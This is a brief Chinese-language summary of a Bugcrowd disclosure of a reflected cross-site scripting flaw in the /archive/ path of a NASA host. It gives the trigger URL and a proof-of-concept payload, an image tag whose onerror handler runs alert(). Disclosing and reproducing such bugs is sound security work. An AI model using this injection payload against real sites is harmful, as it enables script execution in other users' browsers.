# Reflected XSS via URL Path in /archive/ Endpoint - CrowdStream - Bugcrowd

报告地址: https://bugcrowd.com/disclosures/655092e1-8200-4089-a42f-3803edfdeadd/reflected-xss-via-url-path-in-archive-endpoint

## 触发 URL
- https://seabass.gsfc.nasa.gov/archive/<Img

## 利用方法
- 将下列 payload 注入到触发 URL 对应的输入点（常见为 query 参数/路径片段/表单字段），观察是否执行：
  - https://seabass.gsfc.nasa.gov/archive/<Img src=1 onerror=alert()>
